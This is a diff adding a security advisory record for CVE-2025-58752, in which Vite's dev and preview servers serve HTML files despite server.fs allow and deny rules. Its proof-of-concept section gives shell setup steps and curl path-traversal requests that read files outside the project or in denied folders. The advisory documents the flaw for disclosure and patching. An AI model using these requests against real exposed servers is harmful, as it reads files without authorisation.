@@ -1,0 +1,114 @@
+advisory_id: GHSA-jqfw-vq24-v9c3
+datasource_id: github_osv_importer_v2/GHSA-jqfw-vq24-v9c3
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/09/GHSA-jqfw-vq24-v9c3/GHSA-jqfw-vq24-v9c3.json
+aliases:
+  - CVE-2025-58752
+summary: |
+  Vite's `server.fs` settings were not applied to HTML files
+  ### Summary
+  Any HTML files on the machine were served regardless of the `server.fs` settings.
+
+  ### Impact
+
+  Only apps that match the following conditions are affected:
+
+  - explicitly exposes the Vite dev server to the network (using --host or [server.host config option](https://vitejs.dev/config/server-options.html#server-host))
+  - `appType: 'spa'` (default) or `appType: 'mpa'` is used
+
+  This vulnerability also affects the preview server. The preview server allowed HTML files not under the output directory to be served.
+
+  ### Details
+  The [serveStaticMiddleware](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/static.ts#L123) function is in charge of serving static files from the server. It returns the [viteServeStaticMiddleware](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/static.ts#L136) function which runs the needed tests and serves the page. The viteServeStaticMiddleware function [checks if the extension of the requested file is ".html"](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/static.ts#L144). If so, it doesn't serve the page. Instead, the server will go on to the next middlewares, in this case [htmlFallbackMiddleware](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/htmlFallback.ts#L14), and then to [indexHtmlMiddleware](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/indexHtml.ts#L438). These middlewares don't perform any test against allow or deny rules, and they don't make sure that the accessed file is in the root directory of the server. They just find the file and send back its contents to the client.
+
+  ### PoC
+  Execute the following shell commands:
+
+  ```
+  npm  create  vite@latest
+  cd vite-project/
+  echo  "secret" > /tmp/secret.html
+  npm install
+  npm run dev
+  ```
+
+  Then, in a different shell, run the following command:
+
+  `curl  -v  --path-as-is  'http://localhost:5173/../../../../../../../../../../../tmp/secret.html'`
+
+  The contents of /tmp/secret.html will be returned.
+
+  This will also work for HTML files that are in the root directory of the project, but are in the deny list (or not in the allow list). Test that by stopping the running server (CTRL+C), and running the following commands in the server's shell:
+
+  ```
+  echo  'import path from "node:path"; import { defineConfig } from "vite"; export default defineConfig({server: {fs: {deny: [path.resolve(__dirname, "secret_files/*")]}}})'  >  [vite.config.js](http://vite.config.js)
+  mkdir secret_files
+  echo "secret txt" > secret_files/secret.txt
+  echo "secret html" > secret_files/secret.html
+  npm run dev
+
+  ```
+
+  Then, in a different shell, run the following command:
+
+  `curl  -v  --path-as-is  'http://localhost:5173/secret_files/secret.txt'`
+
+  You will receive a 403 HTTP Response,  because everything in the secret_files directory is denied.
+
+  Now in the same shell run the following command:
+
+  `curl  -v  --path-as-is  'http://localhost:5173/secret_files/secret.html'`
+
+  You will receive the contents of secret_files/secret.html.
+impacted_packages:
+  - purl: pkg:npm/vite
+    affected_versions: vers:npm/<=7.1.4
+    fixed_versions: vers:npm/7.1.5
+  - purl: pkg:npm/vite
+    affected_versions: vers:npm/<=7.0.6
+    fixed_versions: vers:npm/7.0.7
+  - purl: pkg:npm/vite
+    affected_versions: vers:npm/<=6.3.5
+    fixed_versions: vers:npm/6.3.6
+  - purl: pkg:npm/vite
+    affected_versions: vers:npm/<=5.4.19
+    fixed_versions: vers:npm/5.4.20
+severities:
+  - score: '2.3'
+    scoring_system: cvssv4
+    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N
+    published_at: None
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/09/GHSA-jqfw-vq24-v9c3/GHSA-jqfw-vq24-v9c3.json
+  - score: LOW
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url:
+weaknesses:
+  - CWE-200
+  - CWE-23
+  - CWE-284
+references:
+  - url: https://github.com/vitejs/vite
+    reference_type:
+    reference_id:
+  - url: https://github.com/vitejs/vite/blob/v7.1.5/packages/vite/CHANGELOG.md
+    reference_type:
+    reference_id:
+  - url: https://github.com/vitejs/vite/commit/0ab19ea9fcb66f544328f442cf6e70f7c0528d5f
+    reference_type:
+    reference_id:
+  - url: https://github.com/vitejs/vite/commit/14015d794f69accba68798bd0e15135bc51c9c1e
+    reference_type:
+    reference_id:
+  - url: https://github.com/vitejs/vite/commit/482000f57f56fe6ff2e905305100cfe03043ddea
+    reference_type:
+    reference_id:
+  - url: https://github.com/vitejs/vite/commit/6f01ff4fe072bcfcd4e2a84811772b818cd51fe6
+    reference_type:
+    reference_id:
+  - url: https://github.com/vitejs/vite/security/advisories/GHSA-jqfw-vq24-v9c3
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2025-58752
+    reference_type:
+    reference_id:
